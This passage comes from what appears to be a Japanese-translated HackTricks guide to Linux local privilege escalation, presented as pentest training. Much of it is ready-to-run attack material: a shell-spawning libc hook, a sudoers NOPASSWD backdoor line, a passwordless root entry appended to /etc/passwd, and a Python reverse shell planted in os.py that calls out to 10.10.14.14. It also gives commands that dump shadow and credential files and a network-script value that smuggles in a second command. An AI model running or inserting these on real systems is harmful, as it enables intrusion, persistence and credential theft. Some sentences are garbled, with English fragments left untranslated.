int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities（権限）

Linux capabilities はプロセスに対して利用可能な root 特権の **subset of the available root privileges to a process** を提供します。これは実質的に root の **privileges into smaller and distinctive units** を分割します。これらの各単位は個別にプロセスへ付与できるため、特権の全体集合が縮小され、悪用のリスクが低減します。\
以下のページを読んで、**capabilities とその悪用方法について詳しく学んでください**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions（ディレクトリ権限）

ディレクトリにおいて、**bit for "execute"** は対象ユーザーが **"cd"** してフォルダに入れることを意味します。\
**"read"** ビットはユーザーが **list** で **files** を確認できることを意味し、**"write"** ビットはユーザーが **delete** および **create** 新しい **files** を行えることを意味します。

## ACLs

Access Control Lists (ACLs) は裁量的権限の二次レイヤーを表し、**overriding the traditional ugo/rwx permissions** が可能です。これらの権限は、所有者でもグループの一員でもない特定のユーザーに対して権利を許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの **granularity ensures more precise access management** により、より細かなアクセス管理が可能になります。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Get** システム上の特定の ACL を持つファイルを取得:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Hidden ACL backdoor on sudoers drop-ins

一般的なミス設定として、`/etc/sudoers.d/` にある root 所有のファイルがモード `440` になっていても、ACL によって low-priv user に対する書き込み権限が付与されてしまうことがあります。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
例えば `user:alice:rw-` のようなものが見える場合、そのユーザーは制限されたモードビットがあっても sudo ルールを追加できます:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
これは高い影響度の ACL persistence/privesc パスです。`ls -l` のみのレビューでは見落としやすいためです。

## Open shell sessions

**古いバージョン**では、別ユーザー（**root**）の**shell**セッションを**hijack**できることがあります。\
**最新バージョン**では、**connect**できるのは**自分のユーザー**のscreen sessionsに限られます。ただし、**セッション内の興味深い情報**が見つかることがあります。

### screen sessions hijacking

**screen sessions を一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux バージョン** による問題でした。非特権ユーザーとして、root によって作成された tmux (v2.1) セッションを hijack できませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日の間にDebian系システム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーは、この脆弱性の影響を受ける可能性があります。\
このバグはこれらのOSで新しいsshキーを生成する際に発生し、**可能なバリエーションはわずか32,768種類**でした。つまり全ての候補を計算でき、**sshの公開鍵を持っていれば対応する秘密鍵を検索できる**ということです。計算済みの候補はここで参照できます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH の注目すべき設定値

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列のアカウントでのログインを許可するかどうかを指定します。デフォルトは `no` です。

### Login control files

これらのファイルは、誰がどのようにログインできるかに影響します:

- **`/etc/nologin`**: 存在する場合、root以外のログインをブロックし、そのメッセージを表示します。
- **`/etc/securetty`**: rootがログインできる場所を制限します（TTYの許可リスト）。
- **`/etc/motd`**: ログイン後のバナー（環境やメンテナンスの詳細をleakする可能性があります）。

### PermitRootLogin

rootがsshでログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: rootはパスワードおよび秘密鍵を使用してログインできます。
- `without-password` or `prohibit-password`: rootは秘密鍵のみでログインできます。
- `forced-commands-only`: rootは秘密鍵でのみログインでき、かつコマンドオプションが指定されている場合に限ります。
- `no` : ログイン不可

### AuthorizedKeysFile

ユーザー認証に使われる公開鍵を含むファイルを指定します。%h のようなトークンを含めることができ、ホームディレクトリに置換されます。 **絶対パスを指定できます**（`/`で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private**キーでログインしようとした場合、ssh があなたのキーの public key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding は、サーバー上に（without passphrases!）鍵を残す代わりに **use your local SSH keys instead of leaving keys** ことを可能にします。したがって、ssh を介して **jump** via ssh **to a host** し、そこから **jump to another** host を **using** the **key** located in your **initial host** ことができます。

このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
注意: `Host` が `*` の場合、ユーザーが別のマシンに接続するたびに、そのホストがキーにアクセスできてしまいます（セキュリティ上の問題）。

ファイル `/etc/ssh_config` はこの**オプション**を**上書き**でき、この設定を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` により ssh-agent forwarding を**許可**または**拒否**できます（デフォルトは許可）。

環境で Forward Agent が設定されているのを見つけた場合、次のページを読んでください。**悪用して権限を昇格できる可能性があります**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` および `/etc/profile.d/` 以下のファイルは、**ユーザーが新しいシェルを実行したときに実行されるスクリプト**です。したがって、これらのいずれかに**書き込みまたは変更できる場合、権限を昇格できます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **sensitive details**.

### Passwd/Shadow Files

OSによっては、`/etc/passwd` と `/etc/shadow` のファイル名が異なっていたり、バックアップが存在することがあります。したがって、**すべてを見つけ**、**読み取れるか確認し**、ファイル内に**hashes**があるかどうかを確認することをお勧めします:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に **password hashes** を見つけることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次にユーザー `hacker` を追加し、生成したパスワードを設定します:

```bash
# 生成したパスワードを変数に保存
password=$(openssl rand -base64 18)

# ユーザーを追加
useradd -m -s /bin/bash hacker

# パスワードを設定
echo "hacker:$password" | chpasswd

# 生成されたパスワードを表示
echo "Generated password: $password"
```
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを使い、`hacker:hacker` を利用できます。

代わりに、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: 現在のマシンのセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSD プラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

一部の機密ファイルに**書き込みができるか**を確認すべきです。たとえば、いくつかの**サービス設定ファイル**に書き込みができますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバを実行していて、**/etc/systemd/内のTomcatサービス設定ファイルを変更できる**場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は次回 tomcat が起動したときに実行されます。

### フォルダの確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読めないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近の数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web ファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでみてください。**パスワードを含む可能性のある複数のファイル**を検索します。\
**もう一つの興味深いツール**として使えるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows、Linux & Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

### ログ

ログを読むことができれば、そこに**興味深い／機密情報**が見つかるかもしれません。ログが奇妙であればあるほど、（おそらく）より興味深いでしょう。\
また、一部の**不適切に**設定された（バックドア入り？）**監査ログ**は、監査ログ内に**パスワードを記録する**ことを可能にするかもしれません。詳細はこの投稿で説明されています: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むためには、**ログ閲覧用のグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名や内容に単語 "**password**" を含むファイル、ログ内の IPs や emails、ハッシュの正規表現も確認してください。\
ここでこれらを行う方法をすべて列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

もし **どこから** python スクリプトが実行されるか分かっていて、そのフォルダに **書き込みできる**（**can write inside**）か、または **python ライブラリを変更できる**（**modify python libraries**）場合は、OS ライブラリを改変して backdoor を仕掛けることができます（python スクリプトが実行される場所に書き込みできるなら、os.py library をコピーして貼り付けてください）。

ライブラリを **backdoor the library** するには、os.py library の末尾に次の行を追加してください（IP と PORT を変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリに対して **書き込み権限** を持つユーザーが権限を昇格できる可能性があります。これは `logrotate` が多くの場合 **root** として動作しており、任意のファイルを実行するよう操作できるためで、特に _**/etc/bash_completion.d/**_ のようなディレクトリで問題となります。ログの場所は _/var/log_ だけでなく、ログローテーションが適用される任意のディレクトリの権限も確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` 以前に影響します

脆弱性の詳細は次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) で悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** に非常に類似しているため、ログを改変できることが分かったら、誰がそれらのログを管理しているかを確認し、ログをシンボリックリンクに置き換えて権限昇格が可能か確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由で、ユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込める** **または** 既存のものを **調整できる** 場合、あなたの **system is pwned**。

Network scripts（例: _ifcg-eth0_）はネットワーク接続に使用されます。見た目は .INI ファイルとまったく同じです。ただし、これらは Network Manager (dispatcher.d) によって Linux 上で \~sourced\~ されます。

私のケースでは、これらの network scripts 内の `NAME=` に割り当てられた値が正しく処理されていません。名前に **空白が含まれていると、システムは空白以降の部分を実行しようとします**。つまり **最初の空白以降のすべてが root として実行されます**。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意_)

### **init, init.d, systemd, と rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所です。**従来の Linux サービス管理システム**。サービスを `start`、`stop`、`restart`、場合によっては `reload` するためのスクリプトが含まれています。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンクを通じて実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` があります。

一方、`/etc/init` は **Upstart** に関連し、Ubuntu が導入した新しい **サービス管理** で、サービス管理タスクのための設定ファイルを使用します。Upstart への移行後も、互換性レイヤーのために SysVinit スクリプトは Upstart 構成と併用され続けています。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドでのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルはディストリビューションパッケージ用に `/usr/lib/systemd/` に、管理者の変更用に `/etc/systemd/system/` に整理され、システム管理を簡素化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は通常、privileged kernel 機能を userspace の manager に公開するために syscall をフックします。脆弱な manager 認証（例：FD-order に基づく署名チェックや弱いパスワードスキーム）は、ローカルアプリが manager を偽装し、既に root のデバイスで root 権限に昇格することを可能にする場合があります。詳細とエクスプロイト手順は以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における regex 駆動の service discovery は、プロセスのコマンドラインからバイナリパスを抽出し、privileged コンテキストで -v オプション付きで実行する可能性があります。許容的なパターン（例：\S を使用）は、/tmp/httpd のような書き込み可能な場所に設置された攻撃者のリスナーとマッチし、root としての実行につながる可能性があります（CWE-426 Untrusted Search Path）。

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC のカーネル脆弱性を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
